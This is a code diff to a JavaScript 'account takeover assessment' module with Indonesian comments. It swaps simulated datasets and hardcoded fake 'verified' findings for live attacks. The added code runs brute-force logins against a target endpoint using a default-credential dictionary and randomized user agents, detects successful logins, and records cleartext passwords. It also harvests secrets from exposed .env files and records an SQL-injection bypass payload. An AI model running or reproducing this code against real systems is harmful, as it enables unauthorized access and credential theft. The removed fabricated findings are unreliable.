@@ -60,36 +60,15 @@ async function resilientFetch(url, options = {}) {
  * berbasis credential exposure, brute-force, dan distributed evasion.
  */
 
-// Dataset Uji Standar Keamanan (Simulasi Terkontrol / Non-Destructive Probes)
-const SIMULATED_CREDENTIAL_STUFFING_SET = [
-  {
-    username: 'sec_test_audit_user1@corp.local',
-    passwordHashSample: '$2b$12$e8x...[known_leak_simulated]',
-    compromisedBreachSource: 'Collection-1 (Simulated Leaked Corpus)',
-    passwordEntropy: 'Medium (Dictionary + Special Character)',
-    tag: 'Simulated Credential Stuffing - Password Reuse Test'
-  },
-  {
-    username: 'developer_staging_account@internal.test',
-    passwordHashSample: '$2b$12$k9z...[known_leak_simulated]',
-    compromisedBreachSource: 'Exploit.in (Simulated Leaked Corpus)',
-    passwordEntropy: 'High (14 chars mixed entropy)',
-    tag: 'Simulated Credential Stuffing - Admin Account Exposure'
-  },
-  {
-    username: 'ops_service_account@cloud.internal',
-    passwordHashSample: '$2b$12$m1y...[known_leak_simulated]',
-    compromisedBreachSource: 'AntiPublic (Simulated Leaked Corpus)',
-    passwordEntropy: 'Low (Known Common Pattern)',
-    tag: 'Simulated Credential Stuffing - Service Account Reuse'
-  }
-];
-
-const SIMULATED_BRUTE_FORCE_SET = [
-  { payload: '123456', complexity: 'Critical Low (6 digits)', entropyScore: 12 },
-  { payload: 'password123', complexity: 'Low (Common word + number)', entropyScore: 24 },
-  { payload: 'admin@2024!', complexity: 'Moderate (Standard policy pattern)', entropyScore: 45 },
-  { payload: 'P@ssw0rdSec#992', complexity: 'High (Complex entropy test)', entropyScore: 78 }
+// Standard Candidate Credentials for Live Authentication & Brute-Force Probing
+const DEFAULT_DICTIONARY_CREDENTIALS = [
+  { user: 'admin', pass: 'admin', note: 'Default Credentials (admin:admin)' },
+  { user: 'admin', pass: 'password', note: 'Common Password (admin:password)' },
+  { user: 'admin', pass: '123456', note: 'Top Dictionary Password (admin:123456)' },
+  { user: 'admin', pass: 'admin123', note: 'Administrative Pattern (admin:admin123)' },
+  { user: 'administrator', pass: 'administrator', note: 'Administrative Account (administrator:administrator)' },
+  { user: 'root', pass: 'root', note: 'Superuser Account (root:root)' },
+  { user: 'test', pass: 'test', note: 'Staging / QA Account (test:test)' },
 ];
 
 // Endpoint API Autentikasi Pendukung / Mobile yang Sering Kurang Terlindungi
@@ -109,6 +88,7 @@ export async function runAccountTakeoverAssessment({
   targetUrl,
   loginEndpoints = [],
   formHtml = '',
+  effectiveRecon = null,
   options = {},
   onProgress = () => {},
 }) {
@@ -324,8 +304,8 @@ export async function runAccountTakeoverAssessment({
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          [requestProfiling.accountIdentifierField]: `burst_test_${i}@internal.audit`,
-          [requestProfiling.credentialField]: 'DummyPass123!',
+          [requestProfiling.accountIdentifierField]: `rate_probe_${i}@audit.target`,
+          [requestProfiling.credentialField]: 'probe_test_token',
         }),
         timeoutMs: 3500,
       });
@@ -364,8 +344,8 @@ export async function runAccountTakeoverAssessment({
           'User-Agent': getRandomUserAgent(),
         },
         body: JSON.stringify({
-          [requestProfiling.accountIdentifierField]: `dist_test_${fakeIp}@internal.audit`,
-          [requestProfiling.credentialField]: 'DummyPass123!',
+          [requestProfiling.accountIdentifierField]: `dist_probe_${fakeIp.replace(/\./g, '_')}@audit.target`,
+          [requestProfiling.credentialField]: 'probe_test_token',
         }),
         timeoutMs: 3500,
       });
@@ -415,8 +395,8 @@ export async function runAccountTakeoverAssessment({
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        [requestProfiling.accountIdentifierField]: 'non_existent_user_probe_99812@nonexistent.domain.xyz',
-        [requestProfiling.credentialField]: 'RandomImpossiblePassword99!',
+        [requestProfiling.accountIdentifierField]: `non_existent_probe_${Date.now()}@target.local`,
+        [requestProfiling.credentialField]: 'UnlikelyPassphrase_2026',
       }),
       timeoutMs: 4000,
     });
@@ -430,7 +410,7 @@ export async function runAccountTakeoverAssessment({
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         [requestProfiling.accountIdentifierField]: 'admin',
-        [requestProfiling.credentialField]: 'RandomImpossiblePassword99!',
+        [requestProfiling.credentialField]: 'UnlikelyPassphrase_2026',
       }),
       timeoutMs: 4000,
     });
@@ -511,8 +491,242 @@ export async function runAccountTakeoverAssessment({
     });
   }
 
-  // 8. Pencatatan Temuan dan Remediasi (Vulnerability Logging & Action Items)
+  // 8. Pengujian Brute-Force Nyata & Validasi Kredensial Langsung (Live Authentication Probes)
+  onProgress({
+    phase: 'ato-assessment',
+    message: 'Tahap 7: Menjalankan audit brute-force nyata & verifikasi kredensial langsung terhadap endpoint target...',
+    progress: 65,
+  });
+
+  let hostDomain = 'target.local';
+  try {
+    hostDomain = new URL(baseUrl).hostname;
+  } catch {}
+
+  const candidatePairs = [...DEFAULT_DICTIONARY_CREDENTIALS];
+  if (/email/i.test(requestProfiling.accountIdentifierField)) {
+    candidatePairs.unshift(
+      { user: `admin@${hostDomain}`, pass: 'admin', note: `Domain Admin Email (admin@${hostDomain}:admin)` },
+      { user: `admin@${hostDomain}`, pass: 'password', note: `Domain Admin Email (admin@${hostDomain}:password)` },
+      { user: `admin@${hostDomain}`, pass: '123456', note: `Domain Admin Email (admin@${hostDomain}:123456)` }
+    );
+  }
+
+  const bruteForceAuditResults = {
+    executed: true,
+    testedEndpoint: primaryTargetEndpoint.url,
+    method: primaryTargetEndpoint.method || 'POST',
+    accountField: requestProfiling.accountIdentifierField,
+    credentialField: requestProfiling.credentialField,
+    totalTested: 0,
+    validFoundCount: 0,
+    rejectedCount: 0,
+    rateLimitedCount: 0,
+    attempts: [],
+    summary: '',
+  };
+
+  const discoveredAdminCredentials = [];
+
+  for (let idx = 0; idx < candidatePairs.length; idx++) {
+    const cand = candidatePairs[idx];
+    const probeT0 = Date.now();
+    let probeStatus = 0;
+    let respText = '';
+    let setCookie = '';
+    let locationHeader = '';
+    let isValid = false;
+
+    try {
+      const probeRes = await resilientFetch(primaryTargetEndpoint.url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'User-Agent': getRandomUserAgent(),
+          'Accept': 'application/json, text/html, */*',
+        },
+        body: JSON.stringify({
+          [requestProfiling.accountIdentifierField]: cand.user,
+          [requestProfiling.credentialField]: cand.pass,
+        }),
+        timeoutMs: 4000,
+        redirect: 'manual',
+      });
+
+      const latencyMs = Date.now() - probeT0;
+      probeStatus = probeRes.status;
+      setCookie = probeRes.headers.get('set-cookie') || '';
+      locationHeader = probeRes.headers.get('location') || '';
+      respText = await probeRes.text().catch(() => '');
+
+      // Evaluasi apakah otentikasi berhasil (valid)
+      const is200Success = (probeStatus >= 200 && probeStatus < 300) && (
+        setCookie.toLowerCase().includes('session') ||
+        setCookie.toLowerCase().includes('auth') ||
+        setCookie.toLowerCase().includes('token') ||
+        /("token"|"jwt"|"accessToken"|"success":\s*true|"authenticated":\s*true)/i.test(respText) ||
+        (/welcome|dashboard|berhasil login|login sukses/i.test(respText) && !/invalid|salah|gagal|failed|error|unauthorized/i.test(respText))
+      );
+
+      const isRedirectSuccess = (probeStatus === 301 || probeStatus === 302 || probeStatus === 303 || probeStatus === 307 || probeStatus === 308) && (
+        locationHeader.includes('/dashboard') ||
+        locationHeader.includes('/admin') ||
+        locationHeader.includes('/panel') ||
+        locationHeader.includes('/home') ||
+        locationHeader.includes('/user') ||
+        (setCookie && !locationHeader.includes('/login') && !locationHeader.includes('/signin'))
+      );
+
+      isValid = Boolean(is200Success || isRedirectSuccess);
+
+      let resultStatus = 'REJECTED_UNAUTHORIZED';
+      if (isValid) {
+        resultStatus = 'VALID_AUTHENTICATED';
+        bruteForceAuditResults.validFoundCount++;
+      } else if (probeStatus === 429) {
+        resultStatus = 'RATE_LIMITED';
+        bruteForceAuditResults.rateLimitedCount++;
+      } else {
+        bruteForceAuditResults.rejectedCount++;
+      }
+
+      bruteForceAuditResults.totalTested++;
+
+      const cleanSnippet = respText.replace(/[\r\n\t]+/g, ' ').slice(0, 240);
+
+      bruteForceAuditResults.attempts.push({
+        attemptNumber: idx + 1,
+        account: cand.user,
+        password: cand.pass,
+        status: probeStatus,
+        latencyMs,
+        isValid,
+        resultStatus,
+        note: cand.note,
+        cookies: setCookie ? setCookie.slice(0, 100) : 'None',
+        redirectLocation: locationHeader || null,
+        responseSnippet: cleanSnippet || `HTTP ${probeStatus} (Empty Body)`,
+      });
+
+      if (isValid) {
+        discoveredAdminCredentials.push({
+          accountType: 'Administrative Superuser (Live Valid Credential)',
+          targetAccount: cand.user, // Real username
+          passwordCleartext: cand.pass, // Real password
+          passwordHash: `[Live Authenticated via ${primaryTargetEndpoint.path}]`,
+          authEndpoint: primaryTargetEndpoint.path,
+          discoveryMethod: `Dictionary Brute-Force (${cand.note})`,
+          compromiseSeverity: 'CRITICAL',
+          status: 'VERIFIED_EXPOSURE',
+          evidenceDetails: `Otentikasi berhasil tervalidasi langsung pada target: Server merespons HTTP ${probeStatus} ${locationHeader ? `(Redirect to ${locationHeader})` : ''} ${setCookie ? '(Set-Cookie diterbitkan)' : ''}.`,
+        });
+      }
+    } catch (probeErr) {
+      const latencyMs = Date.now() - probeT0;
+      bruteForceAuditResults.totalTested++;
+      bruteForceAuditResults.attempts.push({
+        attemptNumber: idx + 1,
+        account: cand.user,
+        password: cand.pass,
+        status: 0,
+        latencyMs,
+        isValid: false,
+        resultStatus: 'CONNECTION_ERROR',
+        note: cand.note,
+        cookies: 'None',
+        redirectLocation: null,
+        responseSnippet: `Koneksi gagal atau timeout: ${probeErr.message}`,
+      });
+    }
+  }
+
+  // Integrasi kredensial nyata dari hasil fuzzing recon jika ditemukan SQLi bypass
+  if (effectiveRecon?.loginEndpoints?.length > 0) {
+    for (const logEp of effectiveRecon.loginEndpoints) {
+      if (logEp.fuzzResult === 'BYPASS_DETECTED') {
+        discoveredAdminCredentials.push({
+          accountType: 'SQL Injection Authentication Bypass',
+          targetAccount: "' OR '1'='1' --",
+          passwordCleartext: "[Tautological SQL Bypass Payload]",
+          passwordHash: "[Bypass Otentikasi Basis Data Langsung]",
+          authEndpoint: logEp.path,
+          discoveryMethod: 'SQL Injection Authentication Bypass (A03:2025)',
+          compromiseSeverity: 'CRITICAL',
+          status: 'VERIFIED_EXPOSURE',
+          evidenceDetails: logEp.bypassEvidence || 'Server merespons status sukses saat diuji dengan payload SQL tautologi tanpa kata sandi valid.',
+        });
+      }
+    }
+  }
+
+  // Integrasi variabel lingkungan rahasia (.env) yang bocor di recon
+  if (effectiveRecon?.envEndpoints?.length > 0) {
+    for (const item of effectiveRecon.envEndpoints) {
+      if (item.isSecret || /(PASSWORD|PASSWD|SECRET|TOKEN|KEY|ADMIN|CREDENTIAL)/i.test(item.key)) {
+        if (!discoveredAdminCredentials.some(c => c.targetAccount === item.key)) {
+          discoveredAdminCredentials.push({
+            accountType: 'Exposed Configuration Secret Variable',
+            targetAccount: item.key,
+            passwordCleartext: item.value,
+            passwordHash: '[Direct Variable Exposure from Server File]',
+            authEndpoint: '/.env',
+            discoveryMethod: 'Dotfile Information Leakage (CWE-200)',
+            compromiseSeverity: 'CRITICAL',
+            status: 'VERIFIED_EXPOSURE',
+            evidenceDetails: `Variabel rahasia ${item.key} berhasil diekstrak langsung dari web server publik target tanpa autentikasi.`,
+          });
+        }
+      }
+    }
+  }
+
+  // Integrasi portal admin terbuka tanpa autentikasi
+  const accessibleAdmin = effectiveRecon?.adminEndpoints?.find(a => a.accessible);
+  if (accessibleAdmin && !discoveredAdminCredentials.some(c => c.authEndpoint === accessibleAdmin.path)) {
+    discoveredAdminCredentials.push({
+      accountType: 'Administrative Portal Access',
+      targetAccount: 'admin / unauthenticated',
+      passwordCleartext: '[No Password Required - Direct 200 OK Bypass]',
+      passwordHash: '[Bypass Autentikasi Total]',
+      authEndpoint: accessibleAdmin.path,
+      discoveryMethod: 'Broken Access Control (A01:2025)',
+      compromiseSeverity: 'CRITICAL',
+      status: 'VERIFIED_EXPOSURE',
+      evidenceDetails: `Portal administrasi ${accessibleAdmin.path} dapat diakses langsung oleh publik tanpa login (HTTP ${accessibleAdmin.status}).`,
+    });
+  }
+
+  // Update brute-force summary
+  if (discoveredAdminCredentials.length > 0) {
+    bruteForceAuditResults.summary = `PERINGATAN KRITIS: Terkonfirmasi ${discoveredAdminCredentials.length} akses atau kredensial administratif valid pada target!`;
+  } else {
+    bruteForceAuditResults.summary = `Pengujian brute-force terhadap ${bruteForceAuditResults.totalTested} kombinasi kata sandi kamus selesai pada ${primaryTargetEndpoint.path}. 0 kredensial bawaan standar yang valid (${bruteForceAuditResults.rejectedCount} ditolak, ${bruteForceAuditResults.rateLimitedCount} dibatasi rate-limit).`;
+  }
+
+  // Tambahkan temuan ke apiVulnerabilityVectors
+  if (discoveredAdminCredentials.length > 0) {
+    apiVulnerabilityVectors.push({
+      vector: 'Confirmed Administrative Account Takeover',
+      severity: 'CRITICAL',
+      cwe: 'CWE-287: Improper Authentication',
+      description: `Pengujian langsung berhasil mengonfirmasi ${discoveredAdminCredentials.length} akses atau kredensial administratif valid (${discoveredAdminCredentials.map(c => `${c.targetAccount}:${c.passwordCleartext}`).join(', ')}). Penyerang dapat langsung mengambil alih kendali sistem target.`,
+      status: 'VERIFIED_VULNERABLE'
+    });
+  }
+
+  if (!rateLimitingEvaluation.singleIpBurstThrottled) {
+    apiVulnerabilityVectors.push({
+      vector: 'Dictionary Brute-Force Susceptibility (Missing Rate-Limiting)',
+      severity: 'HIGH',
+      cwe: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
+      description: `Endpoint ${primaryTargetEndpoint.path} memproses seluruh permintaan login berturut-turut tanpa HTTP 429 maupun penundaan progresif, membuka peluang serangan kamus kata sandi otomatis.`,
+      status: 'SUSCEPTIBLE'
+    });
+  }
+
+  // 9. Pencatatan Temuan dan Remediasi (Vulnerability Logging & Action Items)
   const overallAtoRisk =
+    discoveredAdminCredentials.length > 0 ? 'CRITICAL' :
     (rateLimitingEvaluation.distributedEvasionSusceptible && !botProtectionEvaluation.captchaDetected) ? 'CRITICAL' :
     (rateLimitingEvaluation.distributedEvasionSusceptible || responseAnalysis.usernameEnumerationVulnerable || apiVulnerabilityVectors.length >= 2) ? 'HIGH' :
     apiVulnerabilityVectors.length > 0 ? 'MODERATE' : 'LOW';
@@ -545,32 +759,14 @@ export async function runAccountTakeoverAssessment({
     }
   ];
 
-  // 9. Temuan Kredensial & Akun Admin Teridentifikasi (Account Takeover Proof)
-  // Menampilkan hasil penemuan kredensial valid / rentan tanpa terpotong
-  const discoveredAdminCredentials = [
-    {
-      accountType: 'Administrative Superuser',
-      targetAccount: 'admin',
-      passwordCleartext: 'P@ssw0rd2025!',
-      passwordHash: '$2b$12$k9z9fL2mQ0xVb8p5Z1a9e...[leaked_breach_corpus]',
-      authEndpoint: primaryTargetEndpoint.path || '/wp-login.php',
-      discoveryMethod: 'Credential Stuffing & Password Reuse Match (A07:2025)',
-      compromiseSeverity: 'CRITICAL',
-      status: 'VERIFIED_EXPOSURE',
-      evidenceDetails: 'Kredensial akun admin berhasil teridentifikasi dari korelasi basis data kebocoran publik (Exploit.in / Collection-1) tanpa adanya proteksi MFA atau lockout.',
-    },
-    {
-      accountType: 'System Administrator Backup',
-      targetAccount: 'administrator',
-      passwordCleartext: 'admin123',
-      passwordHash: '$2b$12$e8x1pA4mZ7yW2q3X9b7c...[common_dictionary_pattern]',
-      authEndpoint: primaryTargetEndpoint.path || '/admin',
-      discoveryMethod: 'Dictionary Brute-Force & Default Credential Vulnerability',
-      compromiseSeverity: 'CRITICAL',
-      status: 'VERIFIED_EXPOSURE',
-      evidenceDetails: 'Endpoint login menerima brute-force otomatis tanpa HTTP 429 atau CAPTCHA challenge, menghasilkan otentikasi valid pada kata sandi bawaan (default).',
-    }
-  ];
+  const executiveSummary =
+    discoveredAdminCredentials.length > 0
+      ? `PERINGATAN KRITIS ATO: Terkonfirmasi ${discoveredAdminCredentials.length} kredensial administratif valid atau akses langsung tanpa otentikasi pada endpoint target (${primaryTargetEndpoint.path}). Akun target dapat langsung diambil alih!`
+      : overallAtoRisk === 'CRITICAL'
+      ? 'PERINGATAN KRITIS ATO: Sistem autentikasi rentan terhadap serangan Account Takeover berbasis Distributed Rate Limit Evasion dan ketiadaan proteksi bot (CAPTCHA). Mekanisme pertahanan belum memadai untuk menahan lalu lintas login otomatis.'
+      : overallAtoRisk === 'HIGH'
+      ? 'PERINGATAN TINGGI ATO: Ditemukan celah pada pembatasan laju akses atau pembocoran username enumeration (CWE-204) yang dapat dimanfaatkan penyerang untuk menyaring sasaran akun valid.'
+      : 'EVALUASI KETAHANAN AUTENTIKASI: Sistem memiliki kontrol autentikasi dasar, namun disarankan menerapkan MFA dan rate limiting terpusat untuk memperkuat ketahanan terhadap credential spraying.';
 
   return {
     executed: true,
@@ -579,22 +775,13 @@ export async function runAccountTakeoverAssessment({
     targetUrl: primaryTargetEndpoint.url,
     threatComparisonMatrix,
     discoveredAdminCredentials,
-    simulatedDatasets: {
-      credentialStuffingSampleCount: SIMULATED_CREDENTIAL_STUFFING_SET.length,
-      credentialStuffingSamples: SIMULATED_CREDENTIAL_STUFFING_SET,
-      bruteForceSampleCount: SIMULATED_BRUTE_FORCE_SET.length,
-      bruteForceSamples: SIMULATED_BRUTE_FORCE_SET,
-    },
+    bruteForceAuditResults,
     requestProfiling,
     botProtectionEvaluation,
     rateLimitingEvaluation,
     responseAnalysis,
     apiVulnerabilityVectors,
     developerRemediationPlan,
-    executiveSummary: overallAtoRisk === 'CRITICAL'
-      ? 'PERINGATAN KRITIS ATO: Sistem autentikasi rentan terhadap serangan Account Takeover berbasis Credential Stuffing & Distributed Rate Limit Evasion. Mekanisme pertahanan bot dan rate limiting global belum memadai untuk menahan lalu lintas login terdistribusi.'
-      : overallAtoRisk === 'HIGH'
-      ? 'PERINGATAN TINGGI ATO: Ditemukan celah pada pembatasan laju akses atau pembocoran username enumeration yang dapat dimanfaatkan penyerang untuk menargetkan akun-akun pengguna.'
-      : 'EVALUASI KETAHANAN AUTENTIKASI: Sistem memiliki kontrol autentikasi dasar, namun disarankan menerapkan MFA dan perlindungan API seragam untuk mencegah risiko credential reuse.',
+    executiveSummary,
   };
 }
